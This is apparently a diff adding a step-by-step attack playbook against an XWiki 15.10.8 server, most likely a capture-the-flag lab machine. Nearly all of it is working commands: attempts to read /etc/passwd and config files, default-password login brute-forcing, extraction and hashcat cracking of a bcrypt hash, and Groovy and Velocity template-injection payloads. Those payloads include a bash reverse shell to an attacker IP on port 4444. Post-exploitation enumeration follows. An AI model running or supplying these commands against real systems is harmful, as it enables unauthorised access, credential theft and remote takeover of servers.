@@ -1,0 +1,178 @@
+# SYSTEM 1: EDITOR (XWiki) - Manual Commands
+# IP: 10.129.7.80
+# Target: XWiki 15.10.8 on port 8080
+
+# ============================================
+# PHASE 1: Check XWiki Status
+# ============================================
+
+# Check if XWiki is initialized
+curl -s http://10.129.7.80:8080/xwiki/ | grep -i "initializing\|login\|welcome"
+
+# Check XWiki version via REST API
+curl -s http://10.129.7.80:8080/xwiki/rest/
+
+# Extract version
+curl -s http://10.129.7.80:8080/xwiki/rest/ | grep -oP '<version>\K[^<]+'
+
+# ============================================
+# PHASE 2: File Read Attempts
+# ============================================
+
+# Try to read /etc/passwd
+curl -s "http://10.129.7.80:8080/xwiki/bin/view/Main/WebHome?xpage=plain&content=/etc/passwd"
+
+# Alternative file read attempt
+curl -s "http://10.129.7.80:8080/xwiki/bin/view/etc/passwd"
+
+# Try to read XWiki configuration
+curl -s "http://10.129.7.80:8080/xwiki/bin/view/Main/WebHome?xpage=plain&content=/var/xwiki/xwiki.cfg"
+
+# ============================================
+# PHASE 3: Authentication Attempts
+# ============================================
+
+# Try default credentials: admin/admin
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=admin&j_password=admin" \
+    -L -c cookies_admin.txt \
+    -o login_admin.html
+
+# Check if login successful
+grep -i "logout\|Dashboard\|Welcome" login_admin.html
+
+# Try admin/Password123
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=admin&j_password=Password123" \
+    -L -c cookies_admin2.txt \
+    -o login_admin2.html
+
+# Try xwiki/xwiki
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=xwiki&j_password=xwiki" \
+    -L -c cookies_xwiki.txt \
+    -o login_xwiki.html
+
+# Try Administrator/Administrator
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=Administrator&j_password=Administrator" \
+    -L -c cookies_admin3.txt \
+    -o login_admin3.html
+
+# ============================================
+# PHASE 4: If Authenticated - Hash Extraction
+# ============================================
+
+# Access user profile (replace USERNAME with actual username)
+curl -s -b cookies_admin.txt "http://10.129.7.80:8080/xwiki/bin/view/XWiki/admin" > user_profile.html
+
+# Look for password hashes
+grep -i "password\|hash\|bcrypt\|sha" user_profile.html
+
+# Try to access user configuration files
+curl -s -b cookies_admin.txt "http://10.129.7.80:8080/xwiki/bin/view/XWiki/admin?xpage=plain" > user_config.html
+
+# ============================================
+# PHASE 5: Hash Cracking (if hash found)
+# ============================================
+
+# Extract hash to file (replace with actual hash)
+echo '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' > hash_to_crack.txt
+
+# Crack bcrypt hash
+hashcat -m 3200 hash_to_crack.txt /usr/share/wordlists/rockyou.txt
+
+# Show cracked hash
+hashcat -m 3200 hash_to_crack.txt /usr/share/wordlists/rockyou.txt --show
+
+# ============================================
+# PHASE 6: Template Injection RCE (if authenticated)
+# ============================================
+
+# First, set up reverse shell listener (in another terminal)
+# nc -lvp 4444
+
+# Then login and create a page with Groovy template injection:
+# 1. Go to: http://10.129.7.80:8080/xwiki
+# 2. Login with credentials
+# 3. Create new page or edit existing
+# 4. Add this content:
+
+# Groovy template injection (test command):
+{{groovy}}
+def proc = 'whoami'.execute()
+proc.waitFor()
+println proc.text
+{{/groovy}}
+
+# Groovy reverse shell (replace YOUR_IP):
+{{groovy}}
+def proc = 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'.execute()
+proc.waitFor()
+{{/groovy}}
+
+# Velocity template injection alternative:
+#set($exec = $xwiki.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami'))
+#set($is = $exec.getInputStream())
+#foreach($i in [1..$is.available()])
+$is.read()
+#end
+
+# ============================================
+# PHASE 7: Script Console Access
+# ============================================
+
+# Try to access script console (if authenticated)
+curl -s -b cookies_admin.txt "http://10.129.7.80:8080/xwiki/bin/view/XWiki/GroovyShell" > script_console.html
+
+# Check if accessible
+grep -i "groovy\|script\|console" script_console.html
+
+# If accessible, try executing:
+# println('whoami'.execute().text)
+
+# ============================================
+# PHASE 8: Search for Exploits
+# ============================================
+
+# Search for XWiki exploits
+searchsploit xwiki
+
+# Search for XWiki 15.x exploits
+searchsploit xwiki 15
+
+# Search for XWiki 15.10 exploits
+searchsploit xwiki 15.10
+
+# ============================================
+# PHASE 9: REST API Enumeration
+# ============================================
+
+# Enumerate spaces
+curl -s http://10.129.7.80:8080/xwiki/rest/wikis/xwiki/spaces
+
+# List pages in Main space
+curl -s http://10.129.7.80:8080/xwiki/rest/wikis/xwiki/spaces/Main/pages
+
+# Get page content
+curl -s http://10.129.7.80:8080/xwiki/rest/wikis/xwiki/spaces/Main/pages/WebHome
+
+# ============================================
+# NOTES
+# ============================================
+
+# If you get a shell:
+# - whoami
+# - id
+# - uname -a
+# - cat /etc/passwd
+# - sudo -l
+# - find / -perm -4000 2>/dev/null
+# - cat /root/root.txt
+# - cat /home/*/user.txt
+
+# Reverse shell listener setup:
+# nc -lvp 4444
+
+# Replace YOUR_IP with your Kali IP (check with: ip addr show tun0 or ifconfig)
+
